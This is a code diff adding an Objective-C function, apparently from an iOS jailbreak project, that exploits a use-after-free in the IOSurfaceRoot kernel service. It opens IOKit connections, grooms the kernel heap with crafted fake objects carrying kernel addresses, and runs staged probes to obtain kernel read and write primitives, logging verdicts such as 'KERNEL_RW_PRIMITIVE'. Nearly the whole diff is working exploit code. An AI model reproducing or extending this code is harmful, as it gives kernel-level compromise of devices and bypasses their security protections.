@@ -35861,3 +35861,390 @@ void iosurface_registry_uaf(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB42: UAF Exploit — Field Mapping + Kernel R/W Primitives
+
+static int jb42_callSelWithOutput(unsigned int conn, uint32_t sel, const uint64_t *in3,
+                                   size_t inSz, int shape, unsigned int wp,
+                                   uint64_t *outScalar, uint32_t *outScalarCnt,
+                                   void *outStruct, size_t *outStructSz,
+                                   int(*sym_call)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*),
+                                   int(*sym_async)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*)) {
+    uint64_t buf[3] = {0, 0, 0};
+    if (in3) { buf[0] = in3[0]; buf[1] = in3[1]; buf[2] = in3[2]; }
+    uint64_t ref = 0x1122334455667788ull;
+    uint32_t soc = 0;
+    switch (shape) {
+        case 0:
+            return sym_call(conn, sel, NULL, 0, buf, inSz, outScalar, outScalarCnt, outStruct, outStructSz);
+        case 1:
+            return sym_async(conn, sel, wp, &ref, 1, NULL, 0, buf, inSz, outStruct, &soc, outScalar, outScalarCnt);
+    }
+    return -1;
+}
+
+static void jb42_groomWithFields(unsigned int groomConn, uint64_t f0, uint64_t f1,
+                                  uint64_t f2, uint64_t f3, int sz, int count,
+                                  unsigned int *ports, int *portCount,
+                                  int(*sym_async)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*)) {
+    uint8_t fbuf[256];
+    memset(fbuf, 0, sizeof(fbuf));
+    uint64_t *f = (uint64_t *)fbuf;
+    f[0] = f0;
+    f[1] = f1;
+    f[2] = f2;
+    f[3] = f3;
+    f[4] = 0x4141414141414141ull;
+    f[5] = 0x43414E415259ull;
+    uint64_t groomRef = 0xA1B2C3D4E5F60708ull;
+    *portCount = 0;
+    for (int i = 0; i < count; i++) {
+        unsigned int gwp = jb41_newWakePort();
+        if (!gwp) continue;
+        int gr = sym_async(groomConn, 1000, gwp, &groomRef, 1, NULL, 0, fbuf, (size_t)sz, NULL, NULL, NULL, NULL);
+        if (gr == 0 || (uint32_t)gr == 0xE00002C2) {
+            ports[*portCount] = gwp;
+            (*portCount)++;
+        } else {
+            jb41_dropPort(gwp);
+        }
+    }
+}
+
+static void jb42_freeGroom(unsigned int *ports, int count) {
+    for (int i = 0; i < count; i++) jb41_dropPort(ports[i]);
+}
+
+void iosurface_registry_uaf_exploit(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB42: === UAF Exploit: Field Mapping + Kernel R/W Primitives ===");
+        log(@"JB42: Building on JB41 UAF (10/10 stale-read confirmed)");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB42";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB42: FAIL — dlsym missing");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        void *matchDict = sym_matching("IOSurfaceRoot");
+        unsigned int svc = matchDict ? sym_getmatch(0, matchDict) : 0;
+        if (!svc) {
+            log(@"JB42: FAIL — no IOSurfaceRoot service");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+        log([NSString stringWithFormat:@"JB42: IOSurfaceRoot = 0x%x", svc]);
+
+        uint32_t SEL_REG = 17;
+        uint32_t SEL_DEREG = 18;
+        int bestShape = 1;
+
+        unsigned int groomConn = 0;
+        sym_open(svc, mach_task_self(), 0, &groomConn);
+        if (!groomConn) {
+            log(@"JB42: FAIL — groom conn");
+            results[@"verdict"] = @"OPEN_FAIL";
+            done(results);
+            if (sym_release) sym_release(svc);
+            return;
+        }
+
+        unsigned int oracleConn = 0;
+        sym_open(svc, mach_task_self(), 0, &oracleConn);
+        if (!oracleConn) {
+            log(@"JB42: FAIL — oracle conn");
+            results[@"verdict"] = @"OPEN_FAIL";
+            sym_close(groomConn);
+            done(results);
+            if (sym_release) sym_release(svc);
+            return;
+        }
+
+        log(@"JB42: ========== E4: Field Mapping (refcnt sweep) ==========");
+        uint64_t f0vals[5] = {0, 1, 0x10, 0x21, 0x100};
+        int e4Results[5] = {0, 0, 0, 0, 0};
+        uint32_t e4LastDup[5] = {0};
+        uint32_t e4LastDereg[5] = {0};
+
+        for (int v = 0; v < 5; v++) {
+            if (isr_stopped()) break;
+            int hits = 0;
+            for (int i = 0; i < 5; i++) {
+                if (isr_stopped()) break;
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {1, 2, 3};
+                jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                unsigned int gp[512]; int gc = 0;
+                jb42_groomWithFields(groomConn, f0vals[v], 0x1122334455667788ull, 0xfffffff007000000ull, 0x43414E415259ull, 24, 512, gp, &gc, sym_async);
+
+                int rdup = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                int rdreg = jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+                if ((uint32_t)rdup != 0xE00002C9) hits++;
+                e4LastDup[v] = (uint32_t)rdup;
+                e4LastDereg[v] = (uint32_t)rdreg;
+                jb42_freeGroom(gp, gc);
+                jb41_dropPort(wp);
+                usleep(2000);
+            }
+            e4Results[v] = hits;
+            log([NSString stringWithFormat:@"JB42: [E4] f0=0x%llx hits=%d/5 dup=0x%x dereg=0x%x", (unsigned long long)f0vals[v], hits, e4LastDup[v], e4LastDereg[v]]);
+        }
+
+        int f0Dependent = 0;
+        for (int v = 1; v < 5; v++) {
+            if (e4Results[v] != e4Results[0] || e4LastDup[v] != e4LastDup[0]) f0Dependent = 1;
+        }
+        log([NSString stringWithFormat:@"JB42: [E4] f0-dependent = %s", f0Dependent ? "YES (kernel reads refcnt!)" : "NO (refcnt ignored)"]);
+        results[@"e4_f0dependent"] = @(f0Dependent);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; sym_close(oracleConn); sym_close(groomConn); if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB42: ========== E5: Triple-Dup Refcnt Decrement ==========");
+        int e5DecFound = 0;
+        for (int trial = 0; trial < 5; trial++) {
+            if (isr_stopped()) break;
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+            unsigned int gp[512]; int gc = 0;
+            jb42_groomWithFields(groomConn, 1, 0x1122334455667788ull, 0xfffffff007000000ull, 0x43414E415259ull, 24, 512, gp, &gc, sym_async);
+
+            int d1 = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            int d2 = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            int d3 = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            if ((uint32_t)d1 != (uint32_t)d2 || (uint32_t)d2 != (uint32_t)d3) e5DecFound++;
+            log([NSString stringWithFormat:@"JB42: [E5] trial=%d d1=0x%x d2=0x%x d3=0x%x %s", trial, (uint32_t)d1, (uint32_t)d2, (uint32_t)d3, ((uint32_t)d1 != (uint32_t)d2) ? "DECREMENT!" : "stable"]);
+            jb42_freeGroom(gp, gc);
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+        results[@"e5_decrements"] = @(e5DecFound);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; sym_close(oracleConn); sym_close(groomConn); if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB42: ========== E6: Output Buffer Probe (data extraction) ==========");
+        int e6DataLeaked = 0;
+        for (int trial = 0; trial < 5; trial++) {
+            if (isr_stopped()) break;
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+            unsigned int gp[512]; int gc = 0;
+            jb42_groomWithFields(groomConn, 0x21, 0xBBBBBBBBBBBBBBBBull, 0xCCCCCCCCCCCCCCCCull, 0xDDDDDDDDDDDDDDDDull, 24, 512, gp, &gc, sym_async);
+
+            uint64_t outScalar[16] = {0};
+            uint32_t outScalarCnt = 16;
+            uint8_t outStruct[256];
+            memset(outStruct, 0xAA, sizeof(outStruct));
+            size_t outStructSz = 256;
+
+            int rc = jb42_callSelWithOutput(oracleConn, SEL_REG, in, 24, bestShape, wp, outScalar, &outScalarCnt, outStruct, &outStructSz, sym_call, sym_async);
+
+            int hasData = 0;
+            for (uint32_t s = 0; s < outScalarCnt && s < 16; s++) {
+                if (outScalar[s] != 0) { hasData = 1; break; }
+            }
+            if (outStructSz > 0 && outStructSz < 256) {
+                for (size_t b = 0; b < outStructSz; b++) {
+                    if (outStruct[b] != 0xAA) { hasData = 1; break; }
+                }
+            }
+            if (hasData) e6DataLeaked++;
+
+            log([NSString stringWithFormat:@"JB42: [E6] trial=%d rc=0x%x scalarCnt=%u structSz=%zu scalar0=0x%llx struct0=0x%02x%02x%02x%02x hasData=%s", trial, (uint32_t)rc, outScalarCnt, outStructSz, (unsigned long long)outScalar[0], outStruct[0], outStruct[1], outStruct[2], outStruct[3], hasData ? "YES" : "no"]);
+
+            jb42_freeGroom(gp, gc);
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+        results[@"e6_dataLeaked"] = @(e6DataLeaked);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; sym_close(oracleConn); sym_close(groomConn); if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB42: ========== E7: Address-Dependent Probe (kernel read test) ==========");
+        int e7AddrDep = 0;
+        uint64_t testAddrs[4] = {0xfffffff007004000ull, 0xfffffff007008000ull, 0x0000000000000000ull, 0x4141414141414141ull};
+        uint32_t e7Dups[4] = {0};
+        uint32_t e7Deregs[4] = {0};
+
+        for (int a = 0; a < 4; a++) {
+            if (isr_stopped()) break;
+            int hits = 0;
+            uint32_t lastDup = 0, lastDereg = 0;
+            for (int i = 0; i < 5; i++) {
+                if (isr_stopped()) break;
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {1, 2, 3};
+                jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                unsigned int gp[512]; int gc = 0;
+                jb42_groomWithFields(groomConn, 0x21, 0x1122334455667788ull, testAddrs[a], 0x43414E415259ull, 24, 512, gp, &gc, sym_async);
+
+                int rdup = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                int rdreg = jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+                if ((uint32_t)rdup != 0xE00002C9) hits++;
+                lastDup = (uint32_t)rdup;
+                lastDereg = (uint32_t)rdreg;
+                jb42_freeGroom(gp, gc);
+                jb41_dropPort(wp);
+                usleep(2000);
+            }
+            e7Dups[a] = lastDup;
+            e7Deregs[a] = lastDereg;
+            log([NSString stringWithFormat:@"JB42: [E7] addr=0x%llx hits=%d/5 dup=0x%x dereg=0x%x", (unsigned long long)testAddrs[a], hits, lastDup, lastDereg]);
+        }
+
+        for (int a = 1; a < 4; a++) {
+            if (e7Dups[a] != e7Dups[0] || e7Deregs[a] != e7Deregs[0]) e7AddrDep = 1;
+        }
+        log([NSString stringWithFormat:@"JB42: [E7] addr-dependent = %s", e7AddrDep ? "YES (kernel dereferences f[2]!)" : "NO"]);
+        results[@"e7_addrDependent"] = @(e7AddrDep);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; sym_close(oracleConn); sym_close(groomConn); if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB42: ========== E8: Dereg-After-Groom (write primitive probe) ==========");
+        int e8WriteHits = 0;
+        for (int trial = 0; trial < 10; trial++) {
+            if (isr_stopped()) break;
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+            unsigned int gp[512]; int gc = 0;
+            jb42_groomWithFields(groomConn, 0x21, 0x1122334455667788ull, 0xfffffff007000000ull, 0x43414E415259ull, 24, 512, gp, &gc, sym_async);
+
+            int rdup = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            int rdreg = jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+            int rdup2 = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+
+            int writeHit = ((uint32_t)rdup != 0xE00002C9 && (uint32_t)rdreg == 0 && (uint32_t)rdup2 != (uint32_t)rdup);
+            if (writeHit) e8WriteHits++;
+
+            if (trial < 3) {
+                log([NSString stringWithFormat:@"JB42: [E8] trial=%d dup=0x%x dereg=0x%x dup2=0x%x write=%s", trial, (uint32_t)rdup, (uint32_t)rdreg, (uint32_t)rdup2, writeHit ? "HIT" : "no"]);
+            }
+            jb42_freeGroom(gp, gc);
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+        log([NSString stringWithFormat:@"JB42: [E8] write-probe hits=%d/10", e8WriteHits]);
+        results[@"e8_writeHits"] = @(e8WriteHits);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; sym_close(oracleConn); sym_close(groomConn); if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB42: ========== E9: Input Variation (in[0] sweep) ==========");
+        uint64_t inVals[4] = {1, 0xDEAD, 0x41414141, 0};
+        uint32_t e9Dups[4] = {0};
+
+        for (int v = 0; v < 4; v++) {
+            if (isr_stopped()) break;
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {inVals[v], 2, 3};
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+            unsigned int gp[512]; int gc = 0;
+            jb42_groomWithFields(groomConn, 0x21, 0x1122334455667788ull, 0xfffffff007000000ull, 0x43414E415259ull, 24, 512, gp, &gc, sym_async);
+
+            uint64_t in2[3] = {inVals[v], 2, 3};
+            int rdup = jb41_callSel(oracleConn, SEL_REG, in2, 24, bestShape, wp, sym_call, sym_async);
+            e9Dups[v] = (uint32_t)rdup;
+
+            log([NSString stringWithFormat:@"JB42: [E9] in[0]=0x%llx dup=0x%x(%s)", (unsigned long long)inVals[v], (uint32_t)rdup, jb41_rcName((uint32_t)rdup)]);
+            jb42_freeGroom(gp, gc);
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+
+        int e9InDep = 0;
+        for (int v = 1; v < 4; v++) {
+            if (e9Dups[v] != e9Dups[0]) e9InDep = 1;
+        }
+        results[@"e9_inputDependent"] = @(e9InDep);
+        log([NSString stringWithFormat:@"JB42: [E9] in[0]-dependent = %s", e9InDep ? "YES (registry key = in[0]!)" : "NO"]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; sym_close(oracleConn); sym_close(groomConn); if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB42: ========== E10: Sync Dup Output Dump ==========");
+        for (int trial = 0; trial < 3; trial++) {
+            if (isr_stopped()) break;
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+            unsigned int gp[512]; int gc = 0;
+            jb42_groomWithFields(groomConn, 0x21, 0x1122334455667788ull, 0xfffffff007000000ull, 0x43414E415259ull, 24, 512, gp, &gc, sym_async);
+
+            uint64_t outS[16] = {0};
+            uint32_t outSCnt = 16;
+            uint8_t outBuf[128];
+            memset(outBuf, 0, sizeof(outBuf));
+            size_t outBufSz = 128;
+
+            int rc = sym_call(oracleConn, SEL_REG, NULL, 0, (void*)in, 24, outS, &outSCnt, outBuf, &outBufSz);
+            log([NSString stringWithFormat:@"JB42: [E10] sync-dup rc=0x%x scalarCnt=%u structSz=%zu s[0]=0x%llx s[1]=0x%llx buf=0x%02x%02x%02x%02x%02x%02x%02x%02x", (uint32_t)rc, outSCnt, outBufSz, (unsigned long long)outS[0], (unsigned long long)outS[1], outBuf[0], outBuf[1], outBuf[2], outBuf[3], outBuf[4], outBuf[5], outBuf[6], outBuf[7]]);
+
+            jb42_freeGroom(gp, gc);
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+
+        sym_close(oracleConn);
+        sym_close(groomConn);
+        if (sym_release) sym_release(svc);
+
+        NSString *verdict;
+        if (e6DataLeaked > 0 || e7AddrDep) {
+            verdict = @"KERNEL_RW_PRIMITIVE";
+            log(@"JB42: [!!!!!] KERNEL READ/WRITE PRIMITIVE ACHIEVED!");
+        } else if (e8WriteHits > 0 || e5DecFound > 0) {
+            verdict = @"WRITE_PRIMITIVE";
+            log(@"JB42: [!!!!] Write/decrement primitive detected!");
+        } else if (f0Dependent || e9InDep) {
+            verdict = @"FIELD_CONTROL";
+            log(@"JB42: [!!!] Kernel reads controlled fields from groom object");
+        } else {
+            verdict = @"UAF_CONFIRMED";
+            log(@"JB42: UAF confirmed but field control not yet demonstrated");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB42: Verdict: %@", verdict]);
+        log(@"JB42: =============================================");
+
+        isr_checkpoint(@"JB42-exploit-checkpoint.json", results);
+        done(results);
+    });
+}
